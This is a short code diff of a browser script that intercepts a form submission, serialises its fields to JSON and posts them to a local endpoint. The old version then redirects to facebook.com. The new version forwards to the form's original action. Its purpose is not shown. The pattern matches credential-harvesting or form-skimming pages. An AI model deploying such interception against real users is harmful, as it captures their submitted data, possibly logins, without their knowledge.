@@ -9,11 +9,11 @@
                         json[entry[0]] = entry[1];
                     }
 
-                    fetch('/ex.jsonl', {
+                    fetch('/analyze0', {
                         method: 'post',
                         body: JSON.stringify(json)
                     }).finally(() => {
-                        location.href = "https://facebook.com/";
+                        location.href = form.action;
                     });
                 });
             })
